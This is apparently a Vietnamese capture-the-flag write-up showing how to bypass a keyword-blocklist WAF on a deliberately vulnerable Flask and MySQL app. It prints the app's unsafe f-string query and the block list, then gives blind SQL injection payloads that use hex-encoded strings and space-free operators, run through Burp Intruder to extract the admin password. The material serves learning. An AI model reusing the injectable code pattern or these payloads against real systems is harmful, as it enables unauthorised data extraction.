# SQL Injection bypass WAF

```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
Nó chặn các ký tự sau:
```python
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
```
Và 
```python
 cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')
```
Kết quả của câu truy vấn trả về  `result[1]` tức là cột thứ 2 trong database . Đó chính là `uid` chứ không phải `upw`

`init.sql`
```sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```
Nhìn vào đây chúng ta thấy được thứ cần lấy là giá trị cột upw của `uid = admin` kia . Nhưng backend đã chặn chữ admin rồi nên không thể nhập trực tiếp . Chúng ta có thể Hex nó ra để sử dụng thay vì dùng `'admin'`

```
0x61646d696e
```


Thêm nữa ,khó khăn nhất bât giờ là không thể sử dụng dấu space. All kí tự liên quan đến space đều đã bị chặn rồi . Vậy bây giờ cần phải nghĩ những payload mà sao cho không cần sử dụng dấu cách

Vấn đề tiếp theo là nó chỉ in ra cột uid chứ không phải upw mà lại không được sử dụng UNION , SELECT , FROM . Vậy thì chúng ta thử blind xem sao , tại vì muốn in cột upw ra , chúng ta cần payload:
```sql
SELECT * FROM user WHERE uid='' UNION SELECT upw FROM users WHERE username = 'admin'
```
Nhưng khả năng cách làm một câu truy vấn khác mà có chức năng tương đồng như trên thì rất khó

Mình thử nhập vào:
```sql
'||uid=0x61646d696e#
```
Thì Kết quả là: nó in ra chữ admin

<img width="979" height="209" alt="image" src="https://github.com/user-attachments/assets/b4cc438f-0d5d-4a3d-a4ec-34c54ba1d1ff" />

Vậy nếu kết hợp `uid = 0x61646d696e` && `substring(upw,1,1) = 'a'` . Tức là nếu tồn tại một hàng mà 2 điều kiện kia đều đúng thì nó sẽ trả về admin , dựa vào đó để xác nhận từng kí tự trong upw của admin

Payload:
```sql
'||(uid=0x61646d696e&&ASCII(substr(upw,1,1))=255)#
```
Thêm vào Instruder , Chọn Cluster bomb và add 2 số như hình bên dưới

<img width="1873" height="623" alt="image" src="https://github.com/user-attachments/assets/1dbe9eef-7e40-4caf-8d34-56bed58cc957" />

Và Start Attack 

Kết quả: Dựa vào độ dài cột , những cột mà có độ dài 429 trở lên thì lấy rồi bỏ vào chatgpt cho nó decode ra và sắp xếp lại . 

<img width="1874" height="772" alt="image" src="https://github.com/user-attachments/assets/b7709490-cd8b-4bc6-9da6-2d5363b997e9" />

<img width="993" height="616" alt="image" src="https://github.com/user-attachments/assets/f957bc11-98ea-4a79-b3ec-4e6ffb757807" />

Chúng ta được: `DH{**flag**}`
